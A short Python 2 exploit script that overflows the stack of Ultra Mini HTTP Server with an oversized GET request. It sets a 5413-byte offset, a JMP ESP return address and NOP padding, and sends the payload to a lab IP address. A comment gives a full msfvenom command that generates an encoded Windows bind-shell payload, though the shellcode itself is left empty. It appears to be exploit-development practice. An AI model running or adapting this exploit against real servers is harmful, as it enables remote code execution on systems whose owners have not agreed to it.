#!/usr/bin/python

import socket
import sys
import struct

banner = """
#----------------------------------------------#
Ultra Mini HTTP Server - Offset & JMP ESP
1. python ultramini_http_server_eip2.py
#----------------------------------------------#
"""

print banner
#msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LHOST=172.16.73.129 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -f c
#shellcode = ()

#EIP = 79473479 -> offset at 5413
offset = 'A'*5413

#JMP ESP = !mona jmp -r esp -> 0x7e429353 or \x53\x93\x42\x7e
nowjump = '\x53\x93\x42\x7e'

#bufferandshellcode
sploit = offset + nowjump + "\x90"*192 + "\x90"*len(offset+nowjump)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "\nDestroy them with lazers..."
s.connect(('172.16.73.129',80))
s.send('GET ' + sploit + ' HTTP/1.1\r\n\r\n')
s.close
print "\nFire in the hole! Go pick up the pieces!"
